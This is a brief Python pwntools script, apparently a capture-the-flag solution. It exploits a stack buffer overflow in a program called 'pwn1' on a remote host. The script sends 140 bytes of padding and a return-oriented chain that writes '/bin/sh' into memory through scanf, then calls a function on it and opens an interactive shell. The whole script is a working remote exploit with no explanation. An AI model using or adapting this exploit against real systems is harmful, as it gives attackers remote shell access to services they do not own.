from pwn import *

#p=process('./pwn1')
p=remote('114.55.7.125','8000')
p.recvuntil(':')
scanf=0x80484F0
addesp=0x0804844a
p.sendline('a'*140+p32(scanf)+p32(addesp)+p32(0x0804888F)+p32(0x804A034)+p32(0x12345678)+p32(0x80484B0)+p32(0x12345678)+p32(0x804A034))
#raw_input()
p.recvuntil(':')
p.sendline('1')
p.sendline('/bin/sh\x00')
p.interactive()
